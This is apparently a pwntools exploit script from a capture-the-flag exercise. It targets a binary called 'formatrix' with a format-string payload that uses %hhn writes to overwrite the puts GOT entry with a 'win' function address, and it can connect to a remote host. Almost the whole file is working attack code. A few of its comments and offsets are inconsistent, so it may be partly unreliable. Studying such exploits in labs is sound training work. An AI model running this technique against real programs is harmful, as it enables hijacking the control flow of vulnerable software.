from pwn import *


PROGRAM_PATH = (Path(__file__).parent / "formatrix").resolve().__str__()
# b * printf + 166
# b *0x40131e
#
gdb_script = """
b *main+277
b *main+282
b *main+287
b *main+327
c
"""


frame_size = 0x600  # 544
rbp = 8
buff_size = 0x200


def start(argv=[], *a, **kwargs):
    if args.GDB:
        return gdb.debug([PROGRAM_PATH] + argv, gdbscript=gdb_script, *a, **kwargs)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    else:
        return process([PROGRAM_PATH] + argv, *a, **kwargs)


# Get win_addr
elf = ELF("formatrix")
win_addr: int = elf.symbols["win"]
puts_addr: int = elf.got["puts"]
print(f"The puts address is:{hex(puts_addr)}")
print(f"The win address is:{hex(win_addr)}")
print("____________________________________")
# The puts address is:0x403568
# The win address is:0x4011d6

io = start()
res = io.recvuntil(delims=": ")
print("____________________________________")
print(res)

# 0x40    11   d6
# 64      17   214
# next number that has 40 at the end that can be added to 0x11d6 is 0x1240

# Only lln works
# %214c%24$hhn%59c%25$hhn%47c%26$hhn\001\001\001\001\001\001h5@
# K is the offset
# k = 5
fmt = b"A" * 8
fmt += b"%214c9$hhn"
fmt += f"%{(256 - 0xd6)+0x11}c%7$hhn".encode()
fmt += f"%{(0x40 - 0x11)}c%8$hhn".encode()
print(f"Format len is: {len(fmt)}")
payload = fmt.ljust(len(fmt) + (-len(fmt) % 8), b"\x01")
payload += p64(puts_addr)
payload += p64(puts_addr + 1)
payload += p64(puts_addr + 2)
payload += p64(puts_addr + 3)

# payload = 8 * b"A" + b"|" + b"".join(f"{i}: %p|".encode() for i in range(1, 30))


print(f"Sending payload: {payload}")
print(f"Payload size: {len(payload)}")


io.sendline(payload)

print("____________________________________")
res = io.recvlines(2)
print(res)
io.interactive()


# io.sendline(b"A" * frame_size)
